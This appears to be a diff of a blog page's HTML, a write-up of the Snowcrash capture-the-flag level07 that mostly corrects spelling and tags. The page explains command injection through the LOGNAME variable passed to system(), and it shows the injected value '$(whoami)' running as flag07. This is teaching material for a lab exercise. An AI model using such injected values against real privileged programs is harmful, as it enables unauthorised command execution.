@@ -6,10 +6,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="florian ">
 <meta name="description" content="On the home directory, we have a file level07 with the following pseudo-code
-int main() { char *cmd; asprintf(&amp;amp;cmd, &amp;#34;/bin/echo %s &amp;#34;, getenv(&amp;#34;LOGNAME&amp;#34;)) return system(cmd); } Explenation level07 retrieve the value LOGNAME from the env table,
-then concat the string at the end of /bin/echo  and execute it
- Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the env table  system(char *command) executes a command specified in command by calling /bin/sh -c command" />
-<meta name="keywords" content=", exploit, reverse engineering, arbitrary code execution, shell script" />
+int main() { char *cmd; asprintf(&amp;amp;cmd, &amp;#34;/bin/echo %s &amp;#34;, getenv(&amp;#34;LOGNAME&amp;#34;)) return system(cmd); } Explanation level07 retrieve the value LOGNAME from the env table,
+then join the string at the end of /bin/echo and execute it
+ Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the Env table  system(char *command) executes a command specified in command by calling /bin/sh -c command" />
+<meta name="keywords" content=", Exploit, Reverse Engineering, Arbitrary Code Execution, Shell Script, C" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="/posts/snowcrash/level07/" />
@@ -37,9 +37,9 @@ then concat the string at the end of /bin/echo  and execute it
 
 <meta itemprop="name" content="Snowcrash - Level07">
 <meta itemprop="description" content="On the home directory, we have a file level07 with the following pseudo-code
-int main() { char *cmd; asprintf(&amp;cmd, &#34;/bin/echo %s &#34;, getenv(&#34;LOGNAME&#34;)) return system(cmd); } Explenation level07 retrieve the value LOGNAME from the env table,
-then concat the string at the end of /bin/echo  and execute it
- Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the env table  system(char *command) executes a command specified in command by calling /bin/sh -c command">
+int main() { char *cmd; asprintf(&amp;cmd, &#34;/bin/echo %s &#34;, getenv(&#34;LOGNAME&#34;)) return system(cmd); } Explanation level07 retrieve the value LOGNAME from the env table,
+then join the string at the end of /bin/echo and execute it
+ Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the Env table  system(char *command) executes a command specified in command by calling /bin/sh -c command">
 <meta itemprop="datePublished" content="2020-08-03T15:52:09+02:00" />
 <meta itemprop="dateModified" content="2020-08-03T15:52:09+02:00" />
 <meta itemprop="wordCount" content="93">
@@ -47,29 +47,29 @@ then concat the string at the end of /bin/echo  and execute it
 
 
 
-<meta itemprop="keywords" content="exploit,reverse engineering,arbitrary code execution,shell script," />
+<meta itemprop="keywords" content="Exploit,Reverse Engineering,Arbitrary Code Execution,Shell Script,C," />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content=""/>
 
 <meta name="twitter:title" content="Snowcrash - Level07"/>
 <meta name="twitter:description" content="On the home directory, we have a file level07 with the following pseudo-code
-int main() { char *cmd; asprintf(&amp;cmd, &#34;/bin/echo %s &#34;, getenv(&#34;LOGNAME&#34;)) return system(cmd); } Explenation level07 retrieve the value LOGNAME from the env table,
-then concat the string at the end of /bin/echo  and execute it
- Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the env table  system(char *command) executes a command specified in command by calling /bin/sh -c command"/>
+int main() { char *cmd; asprintf(&amp;cmd, &#34;/bin/echo %s &#34;, getenv(&#34;LOGNAME&#34;)) return system(cmd); } Explanation level07 retrieve the value LOGNAME from the env table,
+then join the string at the end of /bin/echo and execute it
+ Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the Env table  system(char *command) executes a command specified in command by calling /bin/sh -c command"/>
 
 
 
     <meta property="og:title" content="Snowcrash - Level07" />
 <meta property="og:description" content="On the home directory, we have a file level07 with the following pseudo-code
-int main() { char *cmd; asprintf(&amp;cmd, &#34;/bin/echo %s &#34;, getenv(&#34;LOGNAME&#34;)) return system(cmd); } Explenation level07 retrieve the value LOGNAME from the env table,
-then concat the string at the end of /bin/echo  and execute it
- Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the env table  system(char *command) executes a command specified in command by calling /bin/sh -c command" />
+int main() { char *cmd; asprintf(&amp;cmd, &#34;/bin/echo %s &#34;, getenv(&#34;LOGNAME&#34;)) return system(cmd); } Explanation level07 retrieve the value LOGNAME from the env table,
+then join the string at the end of /bin/echo and execute it
+ Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the Env table  system(char *command) executes a command specified in command by calling /bin/sh -c command" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/snowcrash/level07/" />
 <meta property="og:image" content=""/>
 <meta property="article:published_time" content="2020-08-03T15:52:09+02:00" />
-<meta property="article:modified_time" content="2020-08-03T15:52:09+02:00" /><meta property="og:site_name" content="My blog" /><meta property="og:see_also" content="/posts/snowcrash/level14/" /><meta property="og:see_also" content="/posts/snowcrash/level13/" /><meta property="og:see_also" content="/posts/snowcrash/level12/" /><meta property="og:see_also" content="/posts/snowcrash/level11/" /><meta property="og:see_also" content="/posts/snowcrash/level10/" /><meta property="og:see_also" content="/posts/snowcrash/level09/" />
+<meta property="article:modified_time" content="2020-08-03T15:52:09+02:00" /><meta property="og:site_name" content="My blog" />
 
 
 
@@ -166,9 +166,9 @@ then concat the string at the end of /bin/echo  and execute it
   asprintf(<span style="color:#f92672">&amp;</span>cmd, <span style="color:#e6db74">&#34;/bin/echo %s &#34;</span>, getenv(<span style="color:#e6db74">&#34;LOGNAME&#34;</span>))
   <span style="color:#66d9ef">return</span> system(cmd);
 }
-</code></pre></div><h2 id="explenation">Explenation</h2>
+</code></pre></div><h2 id="explanation">Explanation</h2>
 <p><code>level07</code> retrieve the value <strong>LOGNAME</strong> from the <a href="/posts/glossary/env_table">env table</a>,<br>
-then concat the string at the end of <code>/bin/echo </code> and execute it</p>
+then join the string at the end of <code>/bin/echo</code> and execute it</p>
 <ul>
 <li>Simple execution
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level07
@@ -179,12 +179,12 @@ level07
 foobar
 </code></pre></div></li>
 </ul>
-<h2 id="poisoning-the-env-table">Poisoning the env table</h2>
+<h2 id="poisoning-the-env-table">Poisoning the Env table</h2>
 <blockquote>
 <p><code>system(char *command)</code> executes a command specified in <em>command</em> by calling
 <strong>/bin/sh</strong> -c <em>command</em></p>
 </blockquote>
-<p>Because <strong>LOGNAME</strong> is not sanytize, we can execute any command as <strong>flag07</strong></p>
+<p>Because <strong>LOGNAME</strong> is not sanitized, we can execute any command as <strong>flag07</strong></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ LOGNAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$(whoami)&#39;</span> ./level07
 flag07
 </code></pre></div>
@@ -198,7 +198,7 @@ flag07
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
             <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
             <line x1="7" y1="7" x2="7" y2="7"></line>
-          </svg><span class="tag"><a href="tags/exploit/">exploit</a></span><span class="tag"><a href="tags/reverse-engineering/">reverse engineering</a></span><span class="tag"><a href="tags/arbitrary-code-execution/">arbitrary code execution</a></span><span class="tag"><a href="tags/shell-script/">shell script</a></span>
+          </svg><span class="tag"><a href="tags/exploit/">Exploit</a></span><span class="tag"><a href="tags/reverse-engineering/">Reverse Engineering</a></span><span class="tag"><a href="tags/arbitrary-code-execution/">Arbitrary Code Execution</a></span><span class="tag"><a href="tags/shell-script/">Shell Script</a></span><span class="tag"><a href="tags/c/">C</a></span>
         </p>
 
       <p>
